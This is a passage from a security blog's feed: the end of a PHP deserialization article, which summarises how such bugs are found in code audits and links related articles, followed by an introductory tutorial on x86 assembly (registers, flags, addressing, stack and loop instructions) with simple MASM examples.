小结</h2><p>反序列化漏洞一般都是在白盒审计时发现并利用，需要构造PHP序列化代码，利用条件比较苛刻。</p><p>总结一下PHP反序列化的挖掘思路，首先进行反序列化的数据点是用户可控的，然后反序列化类中需要有魔术方法，魔术方法中存在敏感操作，或者魔术方法中无敏感操作，但是其对象调用了其他类中的同名函数，可以通过构造POP链利用。</p><p>另外再贴一些相关文章</p><blockquote><p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="external">https://xz.aliyun.com/t/3336</a><br><a href="https://xz.aliyun.com/t/2733" target="_blank" rel="external">https://xz.aliyun.com/t/2733</a><br><a href="https://www.anquanke.com/post/id/162300" target="_blank" rel="external">https://www.anquanke.com/post/id/162300</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;从浅至深来记录一下PHP反序列化的知识。本文首发于&lt;a href=&quot;https://xz.aliyun.com/t/3674&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;,转载请注明来源&lt;/p&gt;
&lt;h2 id=&quot;0x00-PHP序列化是什
      
    
    </summary>
    
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>汇编基础</title>
    <link href="https://www.twosmi1e.com/2018/11/30/%E6%B1%87%E7%BC%96%E5%9F%BA%E7%A1%80/"/>
    <id>https://www.twosmi1e.com/2018/11/30/汇编基础/</id>
    <published>2018-11-30T06:49:56.000Z</published>
    <updated>2018-12-02T15:33:51.092Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-IA32处理器体系结构"><a href="#0x00-IA32处理器体系结构" class="headerlink" title="0x00 IA32处理器体系结构"></a>0x00 IA32处理器体系结构</h2><h3 id="微机的基本结构"><a href="#微机的基本结构" class="headerlink" title="微机的基本结构"></a>微机的基本结构</h3><p><img src="/2018/11/30/汇编基础/1531925594199.png" alt="Alt text"></p><h3 id="指令执行周期"><a href="#指令执行周期" class="headerlink" title="指令执行周期"></a>指令执行周期</h3><p><img src="/2018/11/30/汇编基础/1531926676886.png" alt="Alt text"><br>当指令使用了内存操作数时还需要两个额外的步骤：取操作数和存储输出操作数。<br>机器指令的执行;</p><ol><li>取指令</li><li>解码</li><li>执行</li></ol><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><p><strong>保护模式</strong>：处理器的基本模式。<br><strong>虚拟8086模式</strong>：多任务环境中执行是地址模式的软件。<br><strong>实地址模式</strong>：用于运行那些需要直接访问系统内存和硬件设备的MS-DOS程序。<br>系统管理模式：实现电源管理和系统安全等功能的机制。</p><h3 id="基本执行环境"><a href="#基本执行环境" class="headerlink" title="基本执行环境"></a>基本执行环境</h3><h4 id="基本寄存器"><a href="#基本寄存器" class="headerlink" title="基本寄存器"></a>基本寄存器</h4><p><strong>寄存器中数据在内存中存放数据遵循高高低低的原则</strong></p><p>8个通用寄存器</p><blockquote><p>EAX EBX ECX EDX<br>EBP ESP ESI EDI</p></blockquote><p><img src="/2018/11/30/汇编基础/1543410901257.png" alt="Alt text"></p><p>6个段寄存器<br><img src="/2018/11/30/汇编基础/1543410911229.png" alt="Alt text"></p><p>一个处理器状态标志寄存器(EFLAGS)和一个指令指针(EIP)寄存器。<br><img src="/2018/11/30/汇编基础/1543410921613.png" alt="Alt text"></p><p>ESP：栈地址寄存器  <strong>任意时刻指向栈顶元素</strong><br>EBP：扩展帧指针寄存器 指向堆栈上的函数参数和局部变量<br>EIP：指令指针寄存器<br><strong>EIP寄存器不能作为MOV指令的⽬标操作数</strong></p><p>EFLAGS：由控制CPU的操作或反映CPU某些运算的结果的独立二进制位构成</p><h4 id="状态标志"><a href="#状态标志" class="headerlink" title="状态标志"></a>状态标志</h4><table><thead><tr><th style="text-align:center">Name</th><th style="text-align:center"></th><th style="text-align:center"></th></tr></thead><tbody><tr><td style="text-align:center">CF</td><td style="text-align:center">进位标志</td><td style="text-align:center">进位或借位时CF=1</td></tr><tr><td style="text-align:center">AC</td><td style="text-align:center">辅助进位标志</td><td style="text-align:center">低4位进位或借位时A=1</td></tr><tr><td style="text-align:center">PF</td><td style="text-align:center">奇偶标志</td><td style="text-align:center">偶数P=1</td></tr><tr><td style="text-align:center">ZF</td><td style="text-align:center">零标志</td><td style="text-align:center">结果为0则Z=1</td></tr><tr><td style="text-align:center">SF</td><td style="text-align:center">符号标志</td><td style="text-align:center">S = 符号位值（补码时0=正，1=负）</td></tr><tr><td style="text-align:center">OF</td><td style="text-align:center">溢出标志</td><td style="text-align:center">运算结果超界时O=1</td></tr><tr><td style="text-align:center">DF</td><td style="text-align:center">Direction Flag</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">IF</td><td style="text-align:center">Intertupt Flag</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">TF</td><td style="text-align:center">Trace Flag</td></tr></tbody></table><h3 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h3><h4 id="实地址模式"><a href="#实地址模式" class="headerlink" title="实地址模式"></a>实地址模式</h4><p>可以寻址1MB内存 0~FFFFF</p><h5 id="20位线性地址"><a href="#20位线性地址" class="headerlink" title="20位线性地址"></a>20位线性地址</h5><p>linear address or abssolute address is 20 bits,range from 0 to FFFFF<br>用段-偏移地址表示</p><ul><li>CS：16位代码段</li><li>DS：16位数据段</li><li>SS：16位堆栈段</li><li>ES,FS,GS可指向其他数据段</li></ul><h4 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h4><p>可以寻址4GB内存 0~FFFFFFFF<br>段寄存器指向段描述符表，操作系统使用段描述符表定位程序使用的段的位置。</p><h2 id="0x01-汇编语言基础"><a href="#0x01-汇编语言基础" class="headerlink" title="0x01 汇编语言基础"></a>0x01 汇编语言基础</h2><h3 id="补码的表示法"><a href="#补码的表示法" class="headerlink" title="补码的表示法"></a>补码的表示法</h3><ul><li>正数的补码：与源码相同</li><li>负数的补码：反码加1</li></ul><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p><img src="/2018/11/30/汇编基础/1543413513831.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543413524273.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543414127600.png" alt="Alt text"></p><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><p><strong>16进制数第一个是字母时要在前面加0</strong></p><h4 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h4><p>一条汇编指令包括4个部分：</p><ul><li>标号（可选）</li><li>助记符</li><li>操作数</li><li>注释(可选)</li></ul><p><img src="/2018/11/30/汇编基础/1543479497975.png" alt="Alt text"></p><h5 id="INVOKE"><a href="#INVOKE" class="headerlink" title="INVOKE"></a>INVOKE</h5><p>相当于call，调用函数或过程</p><h5 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h5><p>伪指令课用于定义变量、宏以及过程，可用于执行命名段以及执行其他与汇编器相关任务。<br><code>.data?</code> :指明未初始化的数据段</p><h5 id="NOP指令"><a href="#NOP指令" class="headerlink" title="NOP指令"></a>NOP指令</h5><p>占用一个字节的存储，什么也不做。</p><h4 id="程序模板"><a href="#程序模板" class="headerlink" title="程序模板"></a>程序模板</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">TITLE</span> Program Template</span><br><span class="line"><span class="comment">; 程序描述：</span></span><br><span class="line"><span class="comment">; 作者：</span></span><br><span class="line"><span class="comment">; 创建日期：</span></span><br><span class="line"><span class="comment">; 修改：</span></span><br><span class="line"><span class="comment">; 日期：  修改者：</span></span><br><span class="line"><span class="symbol">INCLUDE</span> Irvine32.inc</span><br><span class="line"><span class="symbol">.data</span></span><br><span class="line"><span class="comment">;(在此插入变量)</span></span><br><span class="line"><span class="symbol">.code</span></span><br><span class="line"><span class="symbol">main</span> <span class="meta">PROC</span></span><br><span class="line"><span class="comment">;(在此插入可执行代码)</span></span><br><span class="line">exit</span><br><span class="line"><span class="symbol">main</span> <span class="meta">ENDP</span></span><br><span class="line"><span class="comment">;(在此插入其他子程序)</span></span><br><span class="line"><span class="symbol">END</span> main</span><br></pre></td></tr></table></figure><h4 id="汇编-链接-执行"><a href="#汇编-链接-执行" class="headerlink" title="汇编-链接-执行"></a>汇编-链接-执行</h4><p><img src="/2018/11/30/汇编基础/1532701728189.png" alt="Alt text"><br><img src="/2018/11/30/汇编基础/1543480048542.png" alt="Alt text"></p><h3 id="定义数据"><a href="#定义数据" class="headerlink" title="定义数据"></a>定义数据</h3><p>字符常量/字符串常量</p><ul><li>以单引号或双引号括起来的单个/一串字符</li><li>存储为对应字符的ASCII码</li></ul><table><thead><tr><th style="text-align:center">后缀</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:center">d</td><td style="text-align:center">十进制</td></tr><tr><td style="text-align:center">b</td><td style="text-align:center">二进制</td></tr><tr><td style="text-align:center">q</td><td style="text-align:center">八进制</td></tr><tr><td style="text-align:center">h</td><td style="text-align:center">十六进制</td></tr></tbody></table><h4 id="数据定义语句"><a href="#数据定义语句" class="headerlink" title="数据定义语句"></a>数据定义语句</h4><p>初始值可以用<code>?</code>表示不确定，可以是表达式。<br>可以指定多个初始值，用逗号隔开，变量名代表第一个初始值的偏移。</p><p><code>DUP</code>可以为多个数据项分配存储空间。<br><code>V1 BYTE 10 dup (0)</code>V1占用10个字节空间，初值均为0</p><h4 id="符号常量"><a href="#符号常量" class="headerlink" title="符号常量"></a>符号常量</h4><p>等号伪指令：名字=表达式</p><h5 id="计算数组和字符串大小："><a href="#计算数组和字符串大小：" class="headerlink" title="计算数组和字符串大小："></a>计算数组和字符串大小：</h5><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">list <span class="built_in">BYTE</span> <span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span></span><br><span class="line">ListSize = ($ - list)</span><br><span class="line"></span><br><span class="line">list <span class="built_in">word</span> <span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>,<span class="number">40</span></span><br><span class="line">ListSize = ($-list)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">myString_len = ($ - myString)</span><br></pre></td></tr></table></figure><h5 id="EQU和TEXTEQU伪指令："><a href="#EQU和TEXTEQU伪指令：" class="headerlink" title="EQU和TEXTEQU伪指令："></a>EQU和TEXTEQU伪指令：</h5><p>将符号名和整数表达式，文本联系起来。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name <span class="built_in">EQU</span> expression</span><br><span class="line">name <span class="built_in">EQU</span> symbol</span><br><span class="line">name <span class="built_in">EQU</span> &lt;text&gt;</span><br><span class="line"></span><br><span class="line">rowSize = <span class="number">5</span></span><br><span class="line">count TEXTEQU %(rowSize * <span class="number">5</span>)</span><br><span class="line">move TEXTEQU &lt;<span class="keyword">mov</span>&gt;</span><br><span class="line">setupAL TEXTEQU &lt;move <span class="built_in">al</span>, count&gt;</span><br></pre></td></tr></table></figure></p><p>setupAL将被汇编成mov al, 10</p><h2 id="0x02-数据传送，寻址，算术运算"><a href="#0x02-数据传送，寻址，算术运算" class="headerlink" title="0x02 数据传送，寻址，算术运算"></a>0x02 数据传送，寻址，算术运算</h2><h3 id="小尾（小端）顺序"><a href="#小尾（小端）顺序" class="headerlink" title="小尾（小端）顺序"></a>小尾（小端）顺序</h3><p>intel处理器使用小端顺序存储，<strong>最低字节存储在最低地址单元</strong><br><code>Val DWORD 12345678h</code><br><img src="/2018/11/30/汇编基础/1543490102897.png" alt="Alt text"></p><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><h4 id="操作数类型"><a href="#操作数类型" class="headerlink" title="操作数类型"></a>操作数类型</h4><ul><li>立即操作数(immediate)</li><li>寄存器操作数(register)</li><li>内存操作数(memory)</li></ul><p><strong>MOV指令</strong><br><code>MOV destination, source</code></p><ul><li>两个操作数尺寸必须一致</li><li>不能同时为内存操作数</li><li>目的操作数不能是CS, EIP,IP</li><li>立即数不能直接送至段寄存器</li></ul><p><strong>MOVZX</strong><br>复制较小值至较大值中。<br>低八位原样复制，高八位补0扩展，仅适用于无符号整数。<br><strong>MOVSX</strong><br>低八位原样复制，高八位补F扩展，仅适用于有符号整数。<br><strong>LAHF/SAHF</strong><br><code>LAHF</code>将标志局存起<code>EFLAGS</code>的低8位复制到<code>AH</code>寄存器，<code>SAHF</code>是将<code>AH</code>复制到<code>EFLAGS</code><br><strong>XCHG指令</strong><br>交换两个操作数的内容。<br><code>XCHG reg, reg</code><br><code>XCHG reg, mem</code><br><code>XCHG mem, reg</code></p><h4 id="算数指令"><a href="#算数指令" class="headerlink" title="算数指令"></a>算数指令</h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th><th style="text-align:center">影响标志位</th></tr></thead><tbody><tr><td style="text-align:center">INC</td><td style="text-align:center">加1</td><td style="text-align:center">AF OF PF SF <strong>ZF</strong> 不影响<strong>CF</strong></td></tr><tr><td style="text-align:center">DEC</td><td style="text-align:center">减1</td><td style="text-align:center">AF OF PF SF <strong>ZF</strong> 不影响<strong>CF</strong></td></tr><tr><td style="text-align:center">ADD</td><td style="text-align:center">相加</td><td style="text-align:center"><strong>CF</strong> <strong>ZF</strong> SF OF AF PF</td></tr><tr><td style="text-align:center">SUB</td><td style="text-align:center">相减</td><td style="text-align:center"><strong>CF</strong> <strong>ZF</strong> SF OF AF PF</td></tr><tr><td style="text-align:center">NEG</td><td style="text-align:center">取相反数</td><td style="text-align:center"><strong>CF</strong> <strong>ZF</strong> SF OF AF PF</td></tr></tbody></table><h4 id="加减法影响标志位"><a href="#加减法影响标志位" class="headerlink" title="加减法影响标志位"></a>加减法影响标志位</h4><p>INC和DEC不会影响<code>CF</code>标志位<br><img src="/2018/11/30/汇编基础/1543492944768.png" alt="Alt text"><br>NEG影响的标志位和ADD SUB一样<br><img src="/2018/11/30/汇编基础/1543493668513.png" alt="Alt text"></p><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">CF进位位</td><td style="text-align:center">无符号数是无溢出</td></tr><tr><td style="text-align:center">OF溢出位</td><td style="text-align:center">有符号数有无溢出</td></tr><tr><td style="text-align:center">ZF零标位</td><td style="text-align:center">判断结果是否为0</td></tr><tr><td style="text-align:center">SF符号位</td><td style="text-align:center">结果正负</td></tr><tr><td style="text-align:center">PF奇偶标志</td><td style="text-align:center">最低有效字节内1的个数是否为偶数</td></tr><tr><td style="text-align:center">AC辅助进位标志</td><td style="text-align:center">最低有效字节的第三位向高位进位</td></tr></tbody></table><p>加减法算术运算指令的操作数自身不区分有无符号数，程序通过判断不同的标志位来实现对有符号数和无符号数的处理。</p><h4 id="和数据相关的操作符和伪指令"><a href="#和数据相关的操作符和伪指令" class="headerlink" title="和数据相关的操作符和伪指令"></a>和数据相关的操作符和伪指令</h4><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">OFFSET</td><td style="text-align:center">取偏移地址</td></tr><tr><td style="text-align:center">ALIGN</td><td style="text-align:center">设置对齐值</td></tr><tr><td style="text-align:center">PTR</td><td style="text-align:center">重载默认尺寸</td></tr><tr><td style="text-align:center">TYPE</td><td style="text-align:center">返回单个元素大小</td></tr><tr><td style="text-align:center">LENGTHOF</td><td style="text-align:center">计算数组中元素的数目</td></tr><tr><td style="text-align:center">SIZEOF</td><td style="text-align:center">返回LENGTHOF*TYPE</td></tr><tr><td style="text-align:center">LABEL</td><td style="text-align:center">插入一个标号并赋予尺寸</td></tr></tbody></table><p>加逗号可以多行定义<br><img src="/2018/11/30/汇编基础/1543496755807.png" alt="Alt text"><br>LABEL不会分配存储空间<br><img src="/2018/11/30/汇编基础/1543497296112.png" alt="Alt text"></p><h3 id="JMP和LOOP"><a href="#JMP和LOOP" class="headerlink" title="JMP和LOOP"></a>JMP和LOOP</h3><h4 id="JMP"><a href="#JMP" class="headerlink" title="JMP"></a>JMP</h4><p>无条件转移与条件转移<br><img src="/2018/11/30/汇编基础/1543556927203.png" alt="Alt text"><br><code>JMP 目的地址</code><br>功能：接着从目的地址开始执行指令</p><ul><li>目的地址一般为标号</li><li>通常在当前过程内跳转</li></ul><h4 id="LOOP"><a href="#LOOP" class="headerlink" title="LOOP"></a>LOOP</h4><p><code>LOOP 目的地址</code><br>功能：将<code>ecx</code>的值减1，接着与0比较，如果不等于0，就执行目的地址开始的指令，如果等于0 ，则不跳转，接着执行紧跟在LOOP指令后的指令</p><ul><li>通常，<code>ecx</code>里的值就是<strong>循环次数</strong>。但如果初值为0，因是先减1再判断是否等于0，所以，实际实际循环次数就是<code>1 00 00 00 00 H</code>。</li><li><code>LOOPD</code>也使用ecx控制循环，<code>LOOPW</code>使用cx控制循环。</li><li>实模式下，使用的是cx作为控制循环的寄存器</li></ul><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>数组求和：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">INCLUDE irvine32.inc</span><br><span class="line"><span class="meta">.data</span> </span><br><span class="line">  vb1 <span class="built_in">byte</span>  <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> </span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  main proc</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">esi</span>  , offset vb1</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof vb1</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span>    , <span class="number">0</span> </span><br><span class="line"><span class="symbol">   L1:</span></span><br><span class="line">      <span class="keyword">add</span>  <span class="built_in">al</span>   , [ <span class="built_in">esi</span> ]</span><br><span class="line">      <span class="keyword">add</span>  <span class="built_in">esi</span> , type vb1</span><br><span class="line">      <span class="keyword">loop</span> L1</span><br><span class="line">      exit</span><br><span class="line">  main endp</span><br><span class="line">end main</span><br></pre></td></tr></table></figure></p><p>复制字符串：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">INCLUDE irvine32.inc</span><br><span class="line"><span class="meta">.data</span> </span><br><span class="line">  s1  <span class="built_in">byte</span>  <span class="string">"source string"</span>,<span class="number">0</span></span><br><span class="line">  s2  <span class="built_in">byte</span> sizeof s1 dup(<span class="number">0</span>) </span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  main proc</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">esi</span> , <span class="number">0</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">ecx</span> , sizeof s1</span><br><span class="line"><span class="symbol">   L1:</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span> , s1[ <span class="built_in">esi</span> ]</span><br><span class="line">      <span class="keyword">mov</span> s2[<span class="built_in">esi</span>] , <span class="built_in">al</span></span><br><span class="line">      <span class="keyword">inc</span> <span class="built_in">esi</span>  </span><br><span class="line">      <span class="keyword">loop</span> L1</span><br><span class="line">      exit</span><br><span class="line">   main endp</span><br><span class="line">End main</span><br></pre></td></tr></table></figure></p><h3 id="寻址方式总结"><a href="#寻址方式总结" class="headerlink" title="寻址方式总结"></a>寻址方式总结</h3><h4 id="操作数寻址方式"><a href="#操作数寻址方式" class="headerlink" title="操作数寻址方式"></a>操作数寻址方式</h4><p> <img src="/2018/11/30/汇编基础/1543558146706.png" alt="Alt text"><br>数据寻址的基本方式：</p><ol><li>立即寻址</li><li>寄存器寻址</li><li>存储器寻址</li></ol><p>存储器寻址有六种类型</p><blockquote><p><img src="/2018/11/30/汇编基础/1543558414467.png" alt="Alt text"></p></blockquote><p>用寄存器作为指针并操纵寄存器的值。操作数使用间接寻址则叫间接操作数。<br><img src="/2018/11/30/汇编基础/1543497840226.png" alt="Alt text|center"><br><img src="/2018/11/30/汇编基础/1543497846254.png" alt="Alt text|center"></p><h2 id="0x03-过程"><a href="#0x03-过程" class="headerlink" title="0x03 过程"></a>0x03 过程</h2><h3 id="堆栈操作"><a href="#堆栈操作" class="headerlink" title="堆栈操作"></a>堆栈操作</h3><h4 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h4><p>运行时栈是CPU直接管理的内存数组，使用到两个寄存器：SS和ESP</p><ul><li>保护模式下，SS是段选择子，应用程序不应该修改它</li><li>ESP是指向栈的特定位置的一个32位偏移值</li><li>一般不会直接修改ESP，而是通过使用CALL，RET，PUSH，POP等指令，由这些指令间接操作ESP。</li><li>ESP指向最后压入到栈的数据</li><li>实模式下，使用的SS和SP</li></ul><p><strong>PUSH</strong><br><code>PUSH r/m16</code><br><code>PUSH r/m32</code><br><code>PUSH imm32</code></p><p>压栈，将操作数放入堆栈中：</p><ol><li>将ESP减4</li><li>将要压入的32位值拷贝到ESP指向的内存。<br><img src="/2018/11/30/汇编基础/1543559966280.png" alt="Alt text"></li></ol><p>对于32位操作数，ESP减4，存到栈中的内容为双字；对于16位操作数，ESP减2，存到栈中的内容为字<br><strong>POP</strong><br><code>POP r/m16</code><br><code>POP r/m32</code></p><p>出栈，从堆栈中取出操作数放到指令中的操作数中</p><ol><li>将ESP所指向内存中的内容取出放到操作数中</li><li>将ESP加4<br><img src="/2018/11/30/汇编基础/1543560050329.png" alt="Alt text"><br>对于32位操作数，是先从栈中拷贝双字到操作数中，然后ESP加4；对于16位操作数，是先从栈中拷贝字到操作数中，然后ESP加2。</li></ol><p><strong>PUSHFD</strong> 把32位标志寄存器压入堆栈<br><strong>POPFD</strong> 从堆栈中弹出32位值到标志寄存器中<br><strong>两指令无操作数</strong><br>实模式下标志寄存器是16位的，入栈出栈指令分别是PUSHF，POPF。<br><strong>PUSHAD</strong> 把八个32位通用寄存器按序全部压入堆栈<br><strong>POPAD</strong>是以上序反序从堆栈中依次弹出值到八个32位通用寄存器中</p><h3 id="过程定义"><a href="#过程定义" class="headerlink" title="过程定义"></a>过程定义</h3><h4 id="PROC"><a href="#PROC" class="headerlink" title="PROC"></a>PROC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">main proc</span><br><span class="line">...</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure><p>一般过程需要返回指令ret，起始过程需要调<code>ExitProcess</code></p><h4 id="CALL和RET"><a href="#CALL和RET" class="headerlink" title="CALL和RET"></a>CALL和RET</h4><p><code>call 过程名</code><br>将EIP压栈（即当前CALL指令的下一条指令的地址），然后将过程名所在地址赋给EIP（相当于跳转到过程名所在的代码处）<br><code>RET</code><br>RET指令是从栈中取出32位地址，赋给EIP。<br><img src="/2018/11/30/汇编基础/1543582686321.png" alt="Alt text"><br>使用寄存器传递过程参数<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span></span><br><span class="line">dArray <span class="built_in">DD</span>  <span class="number">1</span>, <span class="number">2</span> , <span class="number">3</span></span><br><span class="line">dSum  <span class="built_in">DD</span> ?</span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">Main proc</span><br><span class="line">       <span class="keyword">mov</span> <span class="built_in">ebx</span> , offset dArray</span><br><span class="line">       <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof dArray</span><br><span class="line">       <span class="keyword">call</span> SumOf</span><br><span class="line">       <span class="keyword">mov</span> dSum, <span class="built_in">eax</span></span><br><span class="line">       exit</span><br><span class="line">Main endp</span><br><span class="line">SumOf proc</span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">    <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">eax</span> , <span class="number">0</span> </span><br><span class="line"><span class="symbol">L2:</span> <span class="keyword">add</span> <span class="built_in">eax</span> , [<span class="built_in">ebx</span>]</span><br><span class="line">    <span class="keyword">add</span> <span class="built_in">ebx</span> , <span class="number">4</span></span><br><span class="line">    <span class="keyword">loop</span> L2</span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebx</span>     </span><br><span class="line">    <span class="keyword">ret</span></span><br><span class="line">SumOf endp</span><br><span class="line">End main</span><br></pre></td></tr></table></figure></p><h2 id="0x04-条件处理"><a href="#0x04-条件处理" class="headerlink" title="0x04 条件处理"></a>0x04 条件处理</h2><h3 id="布尔和比较指令"><a href="#布尔和比较指令" class="headerlink" title="布尔和比较指令"></a>布尔和比较指令</h3><table><thead><tr><th style="text-align:center">名称</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td style="text-align:center">AND</td><td style="text-align:center">与</td></tr><tr><td style="text-align:center">OR</td><td style="text-align:center">或</td></tr><tr><td style="text-align:center">XOR</td><td style="text-align:center">异或</td></tr><tr><td style="text-align:center">NOT</td><td style="text-align:center">非</td></tr><tr><td style="text-align:center">TEST</td><td style="text-align:center">与，不改变目的操作数只改变标志位</td></tr><tr><td style="text-align:center">BT，BTC，BTR，BTS</td><td style="text-align:center">求补/清零/置位</td></tr></tbody></table><p><strong>尺寸相同</strong><br><code>AND</code>, <code>OR</code>,<code>XOR</code>总是清除溢出标志和进位标志(CF和OF)<br><code>NOT</code><strong>不影响任何标志位</strong></p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><h5 id="小写转大写："><a href="#小写转大写：" class="headerlink" title="小写转大写："></a>小写转大写：</h5><p>同一字母的大写字母和小写字母的ASCII码的区别只在第5位不同，其他各位相同，<strong>小写字母第5位为1，大写字母第5位为0</strong><br>如要把小写转大写，则可将小写的ASCII码与<code>11011111B</code>相与<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span></span><br><span class="line">aName <span class="built_in">byte</span> “Abraham” , <span class="number">0</span></span><br><span class="line">nameSize=($-aName)-<span class="number">1</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">Main proc</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">ecx</span> , nameSize</span><br><span class="line">     <span class="keyword">mov</span> <span class="built_in">esi</span> , <span class="number">0</span></span><br><span class="line"><span class="symbol">L1:</span><span class="keyword">AND</span>  aName[<span class="built_in">esi</span>] , <span class="number">11011111B</span></span><br><span class="line">     <span class="keyword">inc</span> <span class="built_in">esi</span></span><br><span class="line">     <span class="keyword">loop</span> L1</span><br><span class="line">Main endp</span><br><span class="line">End Main</span><br></pre></td></tr></table></figure></p><h5 id="将0-9之间的整数转换为对应数字符号的ASCII码"><a href="#将0-9之间的整数转换为对应数字符号的ASCII码" class="headerlink" title="将0-9之间的整数转换为对应数字符号的ASCII码"></a>将0-9之间的整数转换为对应数字符号的ASCII码</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.data</span><br><span class="line">aNum byte 1,3,2,0</span><br><span class="line">numSize=($-aNum)-1</span><br><span class="line">.code</span><br><span class="line">Main proc</span><br><span class="line">     mov ecx , numSize</span><br><span class="line">     mov esi , 0</span><br><span class="line">L1:OR  